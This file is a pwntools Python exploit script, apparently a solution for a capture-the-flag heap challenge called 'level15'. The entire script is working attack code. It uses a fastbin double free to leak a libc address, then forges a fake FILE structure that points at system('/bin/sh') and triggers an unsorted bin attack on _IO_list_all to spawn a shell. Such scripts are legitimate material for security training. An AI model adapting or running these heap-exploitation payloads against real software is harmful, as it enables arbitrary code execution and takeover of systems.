from pwn import *

DEBUG = 0
elf = ELF("./level15")
libc = elf.libc

index = 0

array_books_size = 20

leak_libc = 0

if DEBUG:
    gs = f'''
    set breakpoint pending on
    break _IO_flush_all_lockp
    enable breakpoints once 1
    continue
    '''
    r = gdb.debug(elf.path,gdbscript=gs)
else:
    r = process(elf.path)

def name_first(name):
    r.recvuntil("> ")
    r.sendline(name)

def write_book(pages,story):
    global index
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline(str(pages))
    r.recvuntil("> ")
    r.sendline(story)
    index += 1
    return index - 1

def destroy(index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("> ")
    r.sendline(str(index))

def reinvent(name):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("> ")
    r.sendline(name)
    r.recvuntil("@ ")
    return r.recvuntil("!\n")


def write_masterpiece(pages,story):
    r.recvuntil("> ")
    r.sendline("133742069")
    r.recvuntil("> ")
    r.sendline(pages)
    
def leak_and_resolve_libc():
    leak = reinvent(cyclic(0xf))
    leak = leak.split(b'\n')[1][:-1]
    leak = leak + b"\x00" * (0x8 - len(leak))
    leak = u64(leak)
    log.success(f"leak = 0x{leak:02x}\n")
    libc.address = leak - 0x58 - libc.sym.main_arena
    log.success(f"libc load address = 0x{libc.address:02x}\n")
    leak_libc = leak
 
"""def get_more_chunks():
    global index
    reinvent(b"A" * (0x100 - 0x20) + p64(0) + p64 (0x61) + p64(0))
    chunk_E = write_book(0x58,"rrr")
    chunk_F = write_book(0x58,"rrr")
    destroy(chunk_E)
    destroy(chunk_F)
    destroy(chunk_E)
    write_book(0x58,p64(array_loc - 0x20))
    write_book(0x58,"A")
    write_book(0x58,"A")
    write_book(0x58,p64(0) * 10)
    log.success("got more chunks to malloc\n")
    index = 0"""

name_loc = 0x602040
array_loc = 0x602140

#leak libc----------------
name_first(b"A" * 0x8 + p64(0x21) + p64(0x0) + p64(0x0))
chunk_A = write_book(0x18, "A" * 0x17)
chunk_B = write_book(0x18, "A" * 0x17)
destroy(chunk_A)
destroy(chunk_B)
destroy(chunk_A)
write_book(0x18, p64(elf.sym.name)  + b"A" * 0xf)
write_book(0x18, "A" * 0x17)
write_book(0x18, "A" * 0x17)
fake_chunk = write_book(0x18, "AAAAIWIN")
reinvent(cyclic(8) + p64(0x91) + cyclic(0x80) + p64(0x0) + p64(0x11) + p64(0x0) + p64(0x11))
destroy(fake_chunk)
leak_and_resolve_libc()

flags = b"/bin/sh\0"
reinvent(flags + p64(0x61) + p64(0) + p64(libc.sym._IO_list_all - 0x10) + p64(elf.sym.name) + p64(elf.sym.name + 0x10) + p64(libc.sym.system)*21 + p64(elf.sym.name+0x30))


log.success("triggering unsorted bin attack")
r.sendline("1")
r.sendline("50")









log.success("---pwned!---")
r.interactive()
